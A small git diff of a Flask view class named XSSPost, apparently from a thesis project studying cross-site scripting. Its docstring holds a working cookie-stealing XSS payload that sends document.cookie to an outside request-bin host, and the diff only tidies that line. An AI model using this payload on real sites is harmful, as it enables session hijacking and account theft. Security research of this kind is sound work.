@@ -4,6 +4,7 @@ from flask import Blueprint, render_template, url_for, redirect, jsonify, reques
 from flask_security import current_user
 from blueprints.forms import PostForm
 
+
 from models import Post
 
 logger = getLogger("THESIS")
@@ -30,7 +31,7 @@ class XSSPost(MethodView):
     methods = ['POST']
 
     """
-    XSS) <script>var i=new Image;i.src="https://enm3vddkwx8b.x.pipedream.net/?"+(document.cookie).toString();</script>
+    XSS) <script>var i=new Image;i.src="https://enm3vddkwx8b.x.pipedream.net/?"+document.cookie;</script>
     """
     
     def post(self):
